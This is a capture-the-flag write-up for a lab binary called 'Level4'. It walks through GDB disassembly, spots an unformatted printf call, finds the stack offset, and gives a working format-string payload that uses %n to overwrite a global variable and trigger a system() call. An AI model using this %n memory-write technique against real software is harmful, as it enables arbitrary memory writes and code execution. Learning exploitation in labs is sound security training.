# Level4

First step - testing the program

	$ ./level4
	coucou
	coucou

The program wait an input and print it

Start it in GDB

	(gdb-peda)$ pdisas main
	Dump of assembler code for function main:
	   0x080484a7 <+0>:		push   ebp
	   0x080484a8 <+1>:		mov    ebp,esp
	   0x080484aa <+3>:		and    esp,0xfffffff0
	   0x080484ad <+6>:		call   0x8048457 <n>
	   0x080484b2 <+11>:	leave
	   0x080484b3 <+12>:	ret
	End of assembler dump.

The main call a function "n"

	(gdb-peda)$ pdisas n
	Dump of assembler code for function n:
	   0x08048457 <+0>:		push   ebp
	   0x08048458 <+1>:		mov    ebp,esp
	   0x0804845a <+3>:		sub    esp,0x218
	   0x08048460 <+9>:		mov    eax,ds:0x8049804
	   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
	   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
	   0x08048471 <+26>:	lea    eax,[ebp-0x208]
	   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
	   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
	   0x0804847f <+40>:	lea    eax,[ebp-0x208]
	   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
	   0x08048488 <+49>:	call   0x8048444 <p>
	   0x0804848d <+54>:	mov    eax,ds:0x8049810
	   0x08048492 <+59>:	cmp    eax,0x1025544
	   0x08048497 <+64>:	jne    0x80484a5 <n+78>
	   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
	   0x080484a0 <+73>:	call   0x8048360 <system@plt>
	   0x080484a5 <+78>:	leave
	   0x080484a6 <+79>:	ret
	End of assembler dump.

3 things here : a "fgets" call, a call to a "p" function, and a condition for a call to "system"

	(gdb-peda)$ pdisas p
	Dump of assembler code for function p:
	   0x08048444 <+0>:		push   ebp
	   0x08048445 <+1>:		mov    ebp,esp
	   0x08048447 <+3>:		sub    esp,0x18
	   0x0804844a <+6>:		mov    eax,DWORD PTR [ebp+0x8]
	   0x0804844d <+9>:		mov    DWORD PTR [esp],eax
	   0x08048450 <+12>:	call   0x8048340 <printf@plt>
	   0x08048455 <+17>:	leave
	   0x08048456 <+18>:	ret
	End of assembler dump.

"printf" call the argument, without formater --> Format string again

The condition for execute "system" is on a global variable "m", need to be equal to 0x1025544 (16930116)

************************************

Check the position of our buffer

	$ python -c 'print "BBBB"+" %x"*15' | ./level4
	BBBB b7ff26b0 bffff694 b7fd0ff4 0 0 bffff658 804848d bffff450 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078

12th position

Let's do the same thing to level4. The "m" address is "0x8049810"

	$ python -c 'print "\x10\x98\x04\x08"+"%12$x"' | ./level4
	8049810

It works, let's inject the number we need : 16930116 - 4

The previous method will be too long

	$ python -c 'print "\x10\x98\x04\x08"+"B"*16930112+"%12$x"' | ./level4

Doesn't work

There is a trick with the modifier "%d", "%XXXd" will get an XXX size int

We can generate our number of bytes like that

With the "%n" modifier

	$ python -c 'print "\x10\x98\x04\x08"+"%16930112d%12$n"' | ./level4

Script it for reproduce!
